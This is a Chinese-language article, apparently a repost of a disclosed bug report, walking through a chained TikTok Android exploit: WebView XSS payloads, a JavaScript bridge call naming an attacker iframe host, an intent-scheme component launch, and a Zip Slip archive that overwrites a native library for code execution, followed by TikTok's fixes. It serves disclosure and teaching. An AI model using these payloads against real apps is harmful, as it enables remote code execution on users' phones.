@@ -1,0 +1,262 @@
+> 埃及安全研究员Sayed Abdelhafiz在TikTok安卓应用程序中发现了多个漏洞，可以将其链接起来以实现远程代码执行。
+
+![1616130611_6054323338a442854abc5.png!small?1616130612873](https://image.3001.net/images/20210319/1616130611_6054323338a442854abc5.png!small?1616130612873)
+
+该安全人员表示，他发现了多个可以链接在一起的漏洞，可以用来实现通过多个危险攻击载体来进行分流的远程代码执行。
+
+他发现的漏洞如下：
+
+> TikTok WebView上的通用XSS
+>
+> Add Wiki Activity的另一个XSS
+>
+> 启动任意组件
+>
+> Tma Test Activity中的Zip Slip
+>
+> RCE
+
+## TikTok WebView上的通用XSS
+
+TikTok使用webview控件，该控件可由一个深度链接触发，触发后即可跳转到收件箱展示页面。WebView处理一些从内部文件中抓取的叫做猎鹰链接的东西，而不是每次用户使用时从他们的服务器上获取，这样可以提高性能。
+
+为了衡量性能，在完成页面加载后，将执行以下功能：
+
+    
+    
+    this.a.evaluateJavascript（“ JSON.stringify（window.performance.getEntriesByName（\'” + this.webviewURL +“ \'））”，v2）;;
+
+安全人员刚开始打算在URL种注入XSS Payload来执行恶意代码，但没有用。于是他写了一个Frida脚本来钩住
+android.webkit.WebView.evaluateJavascript 之后，发现出现了以下代码：
+
+    
+    
+    JSON.stringify（window.performance.getEntriesByName（'https://m.tiktok.com/falcon/?%27）％2Calert（1））％3B％2F％2F'））
+
+有效载荷被编码了，因为它在查询字符串段。所以他决定把有效载荷放在片段段中，在#之后。
+
+https://m.tiktok.com/falcon/#'),alert(1));// 将触发以下行：
+
+    
+    
+    JSON.stringify(window.performance.getEntriesByName('https://m.tiktok.com/falcon/#'),alert(1));//'))
+
+现在，可以看出该WebView中有XSS了。
+
+## Add Wiki Activity的另一个XSS
+
+Add Wiki Activity
+实现URL验证，以确保不会在其中打开黑名单中的URL。但验证只在http或https方案中进行。因为他们认为其他方案都是无效的，不需要验证。
+
+    
+    
+    if(!e.b(arg8)) {
+        com.bytedance.t.c.e.b.a("AbsSecStrategy", "needBuildSecLink : url is invalid.");
+        return false;
+    }public static boolean b(String arg1) {
+        return !TextUtils.isEmpty(arg1) && ((arg1.startsWith("http")) || (arg1.startsWith("https"))) && !e.a(arg1);
+    }
+
+即便验证不是在javascript方案上，也可以使用该方案对该WebView进行XSS攻击。
+
+    
+    
+    window.ToutiaoJSBridge.invokeMethod(JSON.stringify({
+    "__callback_id": "0",
+    "func": "openSchema",
+    "__msg_type": "callback",
+    "params": {
+    "schema": "aweme://wiki?url=javascript://m.tiktok.com/%250adocument.write(%22%3Ch1%3EPoC%3C%2Fh1%3E%22)&disable_app_link=false"
+    },
+    "JSSDK": "1",
+    "namespace": "host",
+    "__iframe_url": "http://iframe.attacker.com/"
+    }));
+
+## 启动任意组件
+
+好消息是Add Wiki Activity WebView也支持intent scheme，并且没有任何限制。但如果以下代码在Add Wiki
+Activity中被执行，User Favorites Activity将被调用。
+
+    
+    
+    location.replace("intent:#Intent;component=com.zhiliaoapp.musically/com.ss.android.ugc.aweme.favorites.ui.UserFavoritesActivity;package=com.zhiliaoapp.musically;action=android.intent.action.VIEW;end;")
+
+## Tma Test Activity中的Zip Slip
+
+安全人员在一个名为split_df_miniapp.apk的分裂包中找到了一个名为Tma Test Activity的活动。Tma Test
+Activity是通过从网上下载一个压缩包，然后解压来更新SDK。
+
+    
+    
+    Uri v5 = Uri.parse(Uri.decode(arg5.toString()));
+    String v0 = v5.getQueryParameter("action");
+    if(m.a(v0, "sdkUpdate")) {
+    m.a(v5, "testUri");
+    this.updateJssdk(arg4, v5, arg6);
+    return;
+    }
+
+要调用更新过程，我们必须设置动作参数为sdkUpdate。
+
+    
+    
+    private final void updateJssdk(Context arg5, Uri arg6, TmaTestCallback arg7) {
+    String v0 = arg6.getQueryParameter("sdkUpdateVersion");
+    String v1 = arg6.getQueryParameter("sdkVersion");
+    String v6 = arg6.getQueryParameter("latestSDKUrl");
+    SharedPreferences.Editor v2 = BaseBundleDAO.getJsSdkSP(arg5).edit();
+    v2.putString("sdk_update_version", v0).apply();
+    v2.putString("sdk_version", v1).apply();
+    v2.putString("latest_sdk_url", v6).apply();
+    DownloadBaseBundleHandler v6_1 = new DownloadBaseBundleHandler();
+    BundleHandlerParam v0_1 = new BundleHandlerParam();
+    v6_1.setInitialParam(arg5, v0_1);
+    ResolveDownloadHandler v5 = new ResolveDownloadHandler();
+    v6_1.setNextHandler(((BaseBundleHandler)v5));
+    SetCurrentProcessBundleVersionHandler v6_2 = new SetCurrentProcessBundleVersionHandler();
+    v5.setNextHandler(((BaseBundleHandler)v6_2));
+    }
+
+它从参数中收集SDK更新信息，然后调用下载 Base Bundle Handler实例，再将下一个处理程序设置为Resolve Download
+Handler，然后设置当前的Process Bundle Version Handler。
+
+Base Bundle Handler会检查sdk Update
+Version参数，看它是否比当前的更新。我们可以将值设置为99.99.99来避免这个检查，然后开始下载：
+
+    
+    
+    public BundleHandlerParam handle(Context arg14, BundleHandlerParam arg15) {
+    .....
+    String v0 = BaseBundleManager.getInst().getSdkCurrentVersionStr(arg14);
+    String v8 = BaseBundleDAO.getJsSdkSP(arg14).getString("sdk_update_version", "");
+    .....
+    if(AppbrandUtil.convertVersionStrToCode(v0) >= AppbrandUtil.convertVersionStrToCode(v8) && (BaseBundleManager.getInst().isRealBaseBundleReadyNow())) {
+    InnerEventHelper.mpLibResult("mp_lib_validation_result", v0, v8, "no_update", "", -1L);
+    v10.appendLog("no need update remote basebundle version");
+    arg15.isIgnoreTask = true;
+    return arg15;
+    }
+    .....
+    this.startDownload(v9, v10, arg15, v0, v8);
+    .....
+
+在开始下载的过程中，研究人员发现：
+
+    
+    
+    v2.a = StorageUtil.getExternalCacheDir（AppbrandContext.getInst（）。getApplicationContext（））。getPath（）; 
+    v2.b = this.getMd5FromUrl（arg16）;
+
+v2.a是下载路径。它从中获取应用程序上下文，AppbrandContext并且必须具有实例。但是，应用程序并没有一直启动该实例。
+
+下载处理完成后，文件传递到ResolveDownloadHandler，以将其解压。
+
+    
+    
+    public BundleHandlerParam handle(Context arg13, BundleHandlerParam arg14) {
+        BaseBundleEvent v0 = arg14.baseBundleEvent;
+        if((arg14.isLastTaskSuccess) && arg14.targetZipFile != null && (arg14.targetZipFile.exists())) {
+            arg14.bundleVersion = BaseBundleFileManager.unZipFileToBundle(arg13, arg14.targetZipFile, "download_bundle", false, v0);public static long unZipFileToBundle(Context arg8, File arg9, String arg10, boolean arg11, BaseBundleEvent arg12) {
+        long v10;
+        boolean v4;
+        Class v0 = BaseBundleFileManager.class;
+        synchronized(v0) {
+            boolean v1 = arg9.exists();
+        }
+        if(!v1) {
+            return 0L;
+        }
+        try {
+            File v1_1 = BaseBundleFileManager.getBundleFolderFile(arg8, arg10);
+            arg12.appendLog("start unzip" + arg10);
+            BaseBundleFileManager.tryUnzipBaseBundle(arg12, arg10, v1_1.getAbsolutePath(), arg9);private static void tryUnzipBaseBundle(BaseBundleEvent arg2, String arg3, String arg4, File arg5) {
+        try {
+            arg2.appendLog("unzip" + arg3);
+            IOUtils.unZipFolder(arg5.getAbsolutePath(), arg4);
+        }
+        ......
+    }public static void unZipFolder(String arg1, String arg2) throws Exception {
+        IOUtils.a(new FileInputStream(arg1), arg2, false);
+    }private static void a(InputStream arg5, String arg6, boolean arg7) throws Exception {
+        ZipInputStream v0 = new ZipInputStream(arg5);
+        while(true) {
+        label_2:
+            ZipEntry v5 = v0.getNextEntry();
+            if(v5 == null) {
+                break;
+            }
+            String v1 = v5.getName();
+            if((arg7) && !TextUtils.isEmpty(v1) && (v1.contains("../"))) { // Are you notice arg7?
+                goto label_2;
+            }
+            if(v5.isDirectory()) {
+                new File(arg6 + File.separator + v1.substring(0, v1.length() - 1)).mkdirs();
+                goto label_2;
+            }
+            File v5_1 = new File(arg6 + File.separator + v1);
+            if(!v5_1.getParentFile().exists()) {
+                v5_1.getParentFile().mkdirs();
+            }
+            v5_1.createNewFile();
+            FileOutputStream v1_1 = new FileOutputStream(v5_1);
+            byte[] v5_2 = new byte[0x400];
+            while(true) {
+                int v3 = v0.read(v5_2);
+                if(v3 == -1) {
+                    break;
+                }
+                v1_1.write(v5_2, 0, v3);
+                v1_1.flush();
+            }
+            v1_1.close();
+        }
+        v0.close();
+    }
+
+在解压文件的最后一个方法中，有一个路径遍历检查，但由于arg7值为false，所以检查不会发生。这使得我们能够利用ZIP Slip，覆盖一些有用的文件。
+
+## RCE
+
+研究人员创建了一个zip文件，路径遍历了文件名，覆盖了
+
+    
+    
+    /data/data/com.zhiliaoapp.musically/app_lib/df_rn_kit/df_rn_kit_a3e37c20900a22bc8836a51678e458f7/arm64-v8a/libjsc.so
+
+文件：
+
+    
+    
+    dphoeniixx@MacBook-Pro Tiktok % 7z l libran_a1ef01b09a3d9400b77144bbf9ad59b1.zip
+    ​
+    7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+    p7zip Version 16.02 (locale=utf8,Utf16=on,HugeFiles=on,64 bits,16 CPUs x64)
+    ​
+    Scanning the drive for archives:
+    1 file, 1930 bytes (2 KiB)
+    ​
+    Listing archive: libran_a1ef01b09a3d9400b77144bbf9ad59b1.zip
+    ​
+    --    Path = libran_a1ef01b09a3d9400b77144bbf9ad59b1.zip
+    Type = zip
+    Physical Size = 1930
+    ​
+    Date Time Attr Size Compressed Name
+    ------------------- ----- ------------ ------------ ------------------------    2020-11-26 04:08:29 ..... 5896 1496 ../../../../../../../../../data/data/com.zhiliaoapp.musically/app_lib/df_rn_kit/df_rn_kit_a3e37c20900a22bc8836a51678e458f7/arm64-v8a/libjsc.so
+    ------------------- ----- ------------ ------------ ------------------------    2020-11-26 04:08:29 5896 1496 1 files
+
+现在我们可以用一个恶意库覆盖native-libraries来执行我们的代码。除非用户重新启动Application，否则它不会被执行。
+
+该安全人员还发布了RCE的最终PoC，并将此问题报告给TikTok安全团队。
+
+## TikTok采取的行动
+
+> 易受攻击的XSS代码已得到解决；
+>
+> TmaTestActivity已被删除
+>
+> 安全团队对意图方案实施了限制，不允许AddWikiActivity和Main WebViewActivity上的TikTok应用程序具有意图。
+
+来源：[medium](https://medium.com/@dPhoeniixx/tiktok-for-android-1-click-rce-240266e78105)
+
